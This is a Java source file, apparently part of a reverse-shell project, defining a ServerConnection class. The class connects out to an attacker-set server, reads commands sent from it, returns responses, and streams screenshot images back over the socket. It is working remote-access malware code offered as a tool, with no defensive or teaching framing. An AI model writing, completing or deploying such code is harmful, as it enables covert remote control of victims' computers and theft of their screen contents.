package obs1d1anc1ph3r.reverseshell;

import java.io.*;
import java.net.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ServerConnection {

    private final String serverIp;
    private final int serverPort;
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private DataOutputStream dataOut;
    private static final Logger logger = Logger.getLogger(ServerConnection.class.getName());

    public ServerConnection(String serverIp, int serverPort) {
        this.serverIp = serverIp;
        this.serverPort = serverPort;
    }

    public synchronized void connect() throws IOException {
        try {
            System.out.println("[-] Connecting to server...");
            socket = new Socket();
            socket.connect(new InetSocketAddress(serverIp, serverPort), 5000);
            socket.setSoTimeout(60000);
            System.out.println("[-*] Connected to server: " + serverIp + ":" + serverPort);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);
            dataOut = new DataOutputStream(socket.getOutputStream());
        } catch (SocketTimeoutException e) {
            logger.log(Level.SEVERE, "Connection timed out: {0}", e.getMessage());
            throw new IOException("Connection timed out", e);
        } catch (UnknownHostException e) {
            logger.log(Level.SEVERE, "Unknown host: {0}", e.getMessage());
            throw new IOException("Unknown host: " + e.getMessage(), e);
        } catch (IOException e) {
            logger.log(Level.SEVERE, "IO error occurred while connecting: {0}", e.getMessage());
            throw e;
        }
    }

    public String readCommand() throws IOException {
        String command = in.readLine();
        if (command == null) {
            throw new IOException("Server connection closed unexpectedly.");
        }
        return command;
    }

    public void sendResponse(String response) {
        if (out != null) {
            out.println(response);
            out.flush();
        } else {
            logger.warning("Attempted to send response while output stream is closed.");
        }
    }

    public void sendScreenShot(byte[] imageBytes) {
        try {
            if (imageBytes != null && imageBytes.length > 0) {
                System.out.println("[DEBUG] Sending screenshot of size: " + imageBytes.length + " bytes");
                sendResponse("screenshot");
                dataOut.writeInt(imageBytes.length);
                dataOut.write(imageBytes);
                dataOut.flush();
            } else {
                logger.warning("Empty screenshot data, nothing sent.");
                sendResponse("Error: Failed to capture screenshot.");
            }
        } catch (IOException ex) {
            logger.log(Level.SEVERE, "Failed to send screenshot", ex);
        }
    }

    public synchronized void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (dataOut != null) {
                dataOut.close();
            }
            if (socket != null) {
                socket.close();
            }
        } catch (IOException e) {
            logger.log(Level.SEVERE, "Error closing resources: " + e.getMessage(), e);
        }
    }
}
